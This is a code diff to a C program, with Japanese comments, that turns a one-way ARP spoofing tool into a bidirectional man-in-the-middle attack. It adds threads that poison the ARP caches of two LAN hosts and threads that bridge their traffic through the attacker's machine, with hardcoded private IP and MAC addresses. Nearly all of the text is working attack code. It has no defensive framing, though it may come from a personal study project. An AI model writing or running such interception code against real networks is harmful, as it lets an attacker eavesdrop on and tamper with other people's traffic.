@@ -29,6 +29,7 @@ typedef struct	{
 }PARAM;
 //ここは手動で変える必要がある！
 PARAM	Param={"enp4s0","lo",1, "192.168.1.4", "192.168.1.110", "A4:5E:60:B7:29:C7", "B8:27:EB:4A:A3:53"};
+//PARAM Param={"enpi0s3","lo",1, "192.168.1.7", "192.168.1.110", "08:00:27:CE:F8:80", "B8:27:EB:4A:A3:53"};
 
 typedef struct    {
     int    soc;
@@ -463,6 +464,12 @@ void *arpspoof(void *p){
     return (NULL);
 }
 
+void *StartMITMBridge(void *p){
+    struct argArp  *arg = (struct argArp *)p;
+    MITMBridge(arg->ip_d, arg->mac_d, arg->ip_s, arg->mac_s);
+    return (NULL);
+}
+
 //---
 
 int main(int argc,char *argv[],char *envp[])
@@ -510,7 +517,9 @@ int main(int argc,char *argv[],char *envp[])
     DebugPrintf("bridge start\n");
     
     pthread_t arpTid;
-    pthread_t bridgeTid;    
+    pthread_t arpTid_r;
+    pthread_t bridgeTid;
+    pthread_t bridgeTid_r;   
     pthread_attr_t  attr;
     
     pthread_attr_init(&attr);
@@ -533,22 +542,31 @@ int main(int argc,char *argv[],char *envp[])
     //MACaddrのコピー
     memcpy(arg_arpspoof.mac_d, bcast, 6);
     memcpy(arg_arpspoof.mac_s, Device[0].hwaddr, 6);
-    
+   
+    //A→BのARPスプーフィング開始。ARPリクエストを送りつける
     int status;
     if((status=pthread_create(&arpTid,&attr, arpspoof, &arg_arpspoof))!=0){
         DebugPrintf("pthread_create:%s\n",strerror(status));
     }
+
+    //IPAddrを入れ替えただけ
     
-    //DebugPrintf("NextRouter=%s\n",my_inet_ntoa_r(&NextRouter,buf,sizeof(buf)));
+    //スレッド用引数の準備
+    struct argArp arg_arpspoof_r;
+    arg_arpspoof_r.soc = Device[0].soc;
+    arg_arpspoof_r.ip_d = recIp.s_addr;
+    arg_arpspoof_r.ip_s = sendIp.s_addr;
+    //MACaddrのコピー
+    memcpy(arg_arpspoof_r.mac_d, bcast, 6);
+    memcpy(arg_arpspoof_r.mac_s, Device[0].hwaddr, 6);
+  
+    //B→AのARPスプーフィング開始。ARPリクエストを送りつける
+    if((status=pthread_create(&arpTid_r,&attr, arpspoof, &arg_arpspoof_r))!=0){
+        DebugPrintf("pthread_create:%s\n",strerror(status));
+    }
     
-    //SendArpRequestB(Device[0].soc, recIp.s_addr, bcast, Device[0].addr.s_addr, Device[0].hwaddr);
-    //sendIp→recIpの通信をこちらに回すARPスプーフィング。相手のIPアドレスに、こちらは端末BのIPアドレス、かつ自分のMACアドレスを入れてリクエストを送る
-    //int     i=0;
-    //for(i=0; i<100; i++){
-    //    SendArpRequestB(Device[0].soc, sendIp.s_addr, bcast, recIp.s_addr, Device[0].hwaddr);
-    //}
     
-    //TODO:あとでPARAMSに移動
+    
     //static  u_char    mac_B[6]={0x00,0x25,0x36,0xC3,0x74,0x16};  //router
     static  u_char    mac_A[6];  //MBP
     str2macaddr(Param.mac_A, mac_A);
@@ -559,12 +577,45 @@ int main(int argc,char *argv[],char *envp[])
     
     //---ARPスプーフィングここまで
     //---ブリッジ
-    MITMBridge(sendIp.s_addr, mac_A, recIp.s_addr, mac_B);
+    
+    //スレッド用引数の準備
+    struct argArp arg_bridge;
+    arg_bridge.soc  = Device[0].soc;
+    arg_bridge.ip_d = sendIp.s_addr;
+    arg_bridge.ip_s = recIp.s_addr;
+    //MACaddrのコピー
+    memcpy(arg_bridge.mac_d, mac_A, 6);
+    memcpy(arg_bridge.mac_s, mac_B, 6);
+   
+    //A→BのARPスプーフィング開始。ARPリクエストを送りつける
+    if((status=pthread_create(&bridgeTid,&attr, StartMITMBridge, &arg_bridge))!=0){
+        DebugPrintf("pthread_create:%s\n",strerror(status));
+    }
+
+    //スレッド用引数の準備
+    struct argArp arg_bridge_r;
+    arg_bridge_r.soc  = Device[0].soc;
+    arg_bridge_r.ip_d = recIp.s_addr;
+    arg_bridge_r.ip_s = sendIp.s_addr;
+    //MACaddrのコピー
+    memcpy(arg_bridge_r.mac_d, mac_B, 6);
+    memcpy(arg_bridge_r.mac_s, mac_A, 6);
+  
+    //B→AのARPスプーフィング開始。ARPリクエストを送りつける
+    if((status=pthread_create(&bridgeTid_r,&attr, StartMITMBridge, &arg_bridge_r))!=0){
+        DebugPrintf("pthread_create:%s\n",strerror(status));
+    }
+    
+    
     //Bridge();
     //---ブリッジここまで
     DebugPrintf("bridge end\n");
 
-    pthread_join(arpTid,NULL);
+    //スレッド終了を待つ
+    pthread_join(arpTid     , NULL);
+    pthread_join(arpTid_r   , NULL);
+    pthread_join(bridgeTid  , NULL);
+    pthread_join(bridgeTid_r, NULL);
     
     close(Device[0].soc);
     close(Device[1].soc);
